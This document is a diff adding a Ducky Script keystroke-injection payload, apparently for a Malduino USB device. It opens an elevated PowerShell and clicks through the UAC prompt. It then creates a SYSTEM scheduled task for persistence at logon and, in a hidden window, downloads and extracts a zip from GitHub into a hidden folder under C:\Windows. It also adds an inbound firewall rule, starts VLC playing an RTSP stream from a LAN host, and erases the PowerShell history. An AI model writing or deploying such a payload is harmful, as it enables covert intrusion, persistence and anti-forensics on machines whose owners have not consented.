@@ -1,0 +1,35 @@
+DELAY 1000
+REM Open Run prompt
+GUI r
+DELAY 1000
+REM Start elevared PowerShell
+STRING PowerShell Start-Process -Verb runAs PowerShell
+ENTER
+DELAY 5000
+ALT y
+ALT t
+DELAY 5000
+REM Shrink PowerShell window
+STRING mode con cols=20 lines=1
+ENTER
+STRING Register-ScheduledTask VLC 
+STRING -Action (New-ScheduledTaskAction -Execute 'C:\Windows\VLC\vlc.exe' -Argument "-I null rtsp://192.168.0.16:6969/Music.sdp --loop" -WorkingDirectory 'C:\Windows\VLC') 
+STRING -Trigger (New-ScheduledTaskTrigger -AtLogon) 
+STRING -Principal (New-ScheduledTaskPrincipal -UserID 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -f;
+REM Preparing hidden PowerShell window for payload
+STRING Start-Process -WindowStyle Hidden PowerShell "
+REM Payload
+STRING cd C:\Windows;
+STRING Mkdir VLC;
+STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/Gyanbu/MalduinoScripts/raw/master/VLC.zip','C:\Windows\VLC.zip');
+STRING Expand-Archive -Path VLC.zip -force;
+STRING Remove-Item VLC.zip;
+STRING cd VLC;
+STRING attrib +s +h /s /d;
+STRING attrib +s +h .;
+STRING New-NetFirewallRule -DisplayName 'VLC' -Direction Inbound -Program 'C:\Windows\VLC\vlc.exe' -Action Allow;
+STRING .\vlc -I null rtsp://192.168.0.16:6969/Music.sdp --loop
+REM End of payload
+REM Clear PowerShell history and exit
+STRING ";(Get-PSReadlineOption).HistorySavePath | rm;exit
+ENTER
